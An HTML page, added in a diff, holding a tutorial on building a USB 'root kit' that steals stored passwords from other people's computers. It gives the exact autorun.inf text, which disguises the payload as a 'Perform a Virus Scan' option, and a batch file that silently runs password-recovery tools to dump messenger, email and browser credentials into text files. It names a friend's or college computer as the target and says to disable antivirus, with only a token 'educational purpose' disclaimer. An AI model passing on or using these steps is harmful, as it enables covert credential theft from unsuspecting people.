@@ -1,0 +1,86 @@
+<html>
+<style>
+
+body{ margin:0; padding:0; 
+
+font-family: 'Open Sans', sans-serif;
+font-family: 'Slabo 27px', serif;
+}
+
+.wrapper {
+    background: #141518;
+    color: #f2f2f2;
+	padding:20px;
+}
+
+
+.para {
+    background: #34373c none repeat scroll 0 0;
+    border-radius: 10px;
+    clear: both;
+    margin-bottom: 15px;
+    margin-left: auto;
+    margin-right: auto;
+    max-width: 900px;
+    overflow: hidden;
+    padding: 0 20px;
+}
+
+.para h2 {
+    font-size: 30px;
+}
+.para  p {
+    font-size: 16px;
+	line-height:24px;
+}
+
+
+.ul-title {
+    font-size: 20px;
+    font-weight: bold;
+}
+
+/*.wrapper p{ margin:0;}
+*/
+
+</style>
+
+<body>
+<div class="wrapper">
+<div class="para">
+
+<p><strong>How to capture passwords using USB&nbsp;Drive</strong></p>
+<strong>Note</strong>:This tutorial is only for educational purpose and do this at your own risk. We don&rsquo;t provide the links of the tools you can Google them and get an updated version of it.
+<p>Today I will show you how to capture Passwords using an USB Pen Drive.<br /> As we all know, Windows stores most of the passwords which are used on a daily<br /> basis, including instant messenger passwords such as MSN, Yahoo, AOL, Windows<br /> messenger etc.<br /> Along with these, Windows also stores passwords of Outlook Express, SMTP, POP,<br /> FTP accounts and auto-complete passwords of many browsers like IE and Firefox.<br /> There exists many tools for recovering these passwords from their stored places.<br /> Using these tools and an USB pen drive you can create your own root kit to&nbsp;capture<br /> passwords from your friend&rsquo;s/college Computer.</p>
+<hr />
+<p>We need the following tools to create our root kit:</p>
+<p><strong>MessenPass</strong>: Recovers the passwords of most popular Instant Messenger programs:<br /> MSN Messenger, Windows Messenger, Yahoo Messenger, ICQ Lite 4.x/2003, AOL<br /> Instant Messenger provided with Netscape 7, Trillian, Miranda, and GAIM.</p>
+<hr />
+<p><strong>Mail PassView</strong>: Recovers the passwords of the following email programs: Outlook<br /> Express, Microsoft Outlook 2000 (POP3 and SMTP Accounts only), Microsoft Outlook<br /> 2002/2003 (POP3, IMAP, HTTP and SMTP Accounts), IncrediMail, Eudora, Netscape<br /> Mail, Mozilla Thunderbird, Group Mail Free.<br /> Mail PassView can also recover the passwords of Web-based email accounts (HotMail,<br /> Yahoo!, G-mail), if you use the associated programs of these accounts.</p>
+<hr />
+<p><strong>IE Passview</strong>: IE PassView is a small utility that reveals the passwords stored by<br /> Internet Explorer browser. It supports the new Internet Explorer 7.0, as well as<br /> older versions of Internet explorer, v4.0 &ndash; v6.0<br /> Protected Storage PassView: Recovers all passwords stored inside the Protected<br /> Storage, including the Auto Complete passwords of Internet Explorer, passwords of<br /> Password-protected sites, MSN Explorer Passwords, and more&hellip;</p>
+<hr />
+<p><strong>PasswordFox</strong>: Password Fox is a small password recovery tool that allows you to view</p>
+<p>the user names and passwords stored by Mozilla Firefox Web browser. By default,<br /> PasswordFox displays the passwords stored in your current profile, but you can easily<br /> select to watch the passwords of any other Firefox profile. For each password entry,<br /> the following information is displayed: Record Index, Web Site, User Name,<br /> Password, User Name Field, Password Field, and the Signons file name.</p>
+<hr />
+<p>Here is a step by step procedre to create the password &nbsp;toolkit:</p>
+<p><strong>NOTE</strong>: You must temporarily disable your antivirus before following these steps.</p>
+<ul>
+<li>Download all the 5 tools, extract them and copy only the executables(.exe files)<br /> into your USB Pendrive.<br /> ie: Copy the files &ndash; mspass.exe, mailpv.exe, iepv.exe, pspv.exe and passwordfox.exe<br /> into your USB Drive.</li>
+<li>&nbsp;Create a new Notepad and write the following text into it:<br /> [autorun]<br /> open=launch.bat<br /> ACTION= Perform a Virus Scan<br /> save the Notepad and rename it from<br /> New Text Document.txt to autorun.inf<br /> Now copy theautorun.inf file onto your USB pendrive.</li>
+<li>Create another Notepad and write the following text onto it:<br /> start mspass.exe /stext mspass.txt<br /> start mailpv.exe /stext mailpv.txt<br /> start iepv.exe /stext iepv.txt<br /> start pspv.exe /stext pspv.txt<br /> start passwordfox.exe /stext passwordfox.txt<br /> save the Notepad and rename it from<br /> New Text Document.txt to launch.bat<br /> Copy the launch.bat file also to your USB drive.</li>
+</ul>
+<p>Now your root kit is ready and you are all set to capture&nbsp;the passwords. You can use this<br /> pendrive on your friend&rsquo;s PC or on your college computer. Just follow these steps</p>
+<ul>
+<li>Insert the pendrive and the autorun window will pop-up. (This is because, we have&nbsp;created an autorun pendrive).</li>
+<li>In the pop-up window, select the first option (Perform a Virus Scan).</li>
+<li>Now all the password hacking tools will silently get executed in the background (This process takes hardly a few seconds). The passwords get stored in the .TXT files.</li>
+<li>Remove the pendrive and you&rsquo;ll see the stored passwords in the .TXT files.</li>
+</ul>
+<p>This works on Windows 2000, XP,Vista and 7,8,8.1 and 10</p>
+<p>NOTE: This procedure will only recover the stored passwords (if any) on the<br /> Computer.This tutorial is only for educational purpose and do this at your own risk.</p>
+
+</div>
+</div>
+</body>
+</html>
